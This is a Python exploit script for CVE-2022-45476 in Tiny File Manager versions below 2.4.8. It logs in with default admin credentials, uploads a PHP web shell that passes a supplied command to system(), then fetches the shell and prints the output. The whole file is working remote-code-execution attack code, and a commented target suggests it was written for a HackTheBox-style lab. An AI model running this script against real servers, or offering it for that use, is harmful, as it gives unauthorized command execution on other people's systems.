#!/usr/bin/python3

import argparse
import requests
import re
from pwn import log
import sys
import string
import random

class tinyfm_rce():
    def __init__(self, tiny, payload, user, password, path):
        self.tiny = tiny
        self.payload = payload
        self.user = user
        self.password = password
        self.path = path
        
    def login(self):
        r = requests.post(self.tiny, data={'fm_usr': self.user, 'fm_pwd': self.password}, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=True)
        if re.search("Login failed. Invalid username or password", r.text) is not None:
            log.error("Invalid credential")
        log.success(f"Successfully logged in with credential -> {self.user}:{self.password}")
        cookies = dict((a.strip(), b.strip()) for a, b in (section.split("=", 1) for section in r.request.headers.get("Cookie").split("&")))
        return cookies
    
    def verify(self, cookies):
        r = requests.get(f'{self.tiny}?p=&upload', cookies=cookies)
        check_webroot = re.search("Destination Folder:\s*([^<]+)", r.text)
        if check_webroot is None:
            log.error("Failed to retrieve webroot")
        webroot = check_webroot.group(1)
        return webroot.strip(" ")
    
    def file_upload(self, cookies):
        url = f'{self.tiny}?p={self.path}'
        r = requests.get(url, cookies=cookies, allow_redirects=False)
        if r.status_code != 200:
            log.error(f'Invalid path -> {url}')
        else:
            filename = ''.join(random.choice(string.ascii_lowercase) for i in range(4)) + '.php'
            log.info(f'Creating random filename -> {filename}')
            files = {'file': (f'{filename}', f'<?php system("{self.payload}");?>')}
            data = {'fullpath': filename}
            log.info(f'Uploading {filename} on "{url}"')
            r = requests.post(url, cookies=cookies, data=data,files=files)
            if r.json()['status'] == 'success':
                log.success(f'{filename} successfully uploaded')
                trigger = f'{url}&view={filename}'
                log.info(f'Extrating uploaded PHP url on "{trigger}"')
                r = requests.get(trigger, cookies=cookies)
                php = re.search('<a href="(.*?)" target="_blank"><i class="fa fa-external-link-square"><\/i> Open<\/a>', r.text)
                if php is not None:
                    log.info(f'Executing PHP on "{php.group(1)}"')
                    r = requests.get(php.group(1), cookies=cookies)
                    log.success('Output:')
                    return r.text
                        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2022-45476: Tiny File Manager < 2.4.8 Insecure File Upload")
    parser.add_argument('--url', help='Tiny File Manager URL. Ex: http://soccer.htb/tiny/tinyfilemanager.php')
    parser.add_argument('--payload', help='Command to execute')
    parser.add_argument('--username', help='Username', default='admin')
    parser.add_argument('--password', help='Password', default='admin@123')
    parser.add_argument('--path', help='Vulnerable upload path')
    args = parser.parse_args()
    tiny_url = args.url
    payload = args.payload
    username = args.username
    password = args.password
    path = args.path
    if len(sys.argv) < 2:
        log.error('Missing arguments! Please run with --help for more details.')
    else:
        if all(argument is not None for argument in [tiny_url, payload, username, password, path]):
            # tiny = "http://soccer.htb/tiny/tinyfilemanager.php"
            if not tiny_url.endswith("tinyfilemanager.php"):
                log.error("Tiny URL must ends with 'tinyfilemanager.php'. Ex: http://dugisan3rd.my/tinyfilemanager.php")
            # exploit = tinyfm_rce(tiny_url, "id", "admin", "admin@123", 'tiny/uploads')
            exploit = tinyfm_rce(tiny_url, payload, username, password, path)
            cookies = exploit.login()
            log.success(f"Retrieving cookies -> {cookies}")
            # webroot = exploit.verify(cookies)
            log.success(f"Retrieving webroot -> '{exploit.verify(cookies)}'")
            print(exploit.file_upload(cookies))
        else:
            log.error('Missing arguments! Please run with --help for more details.')
    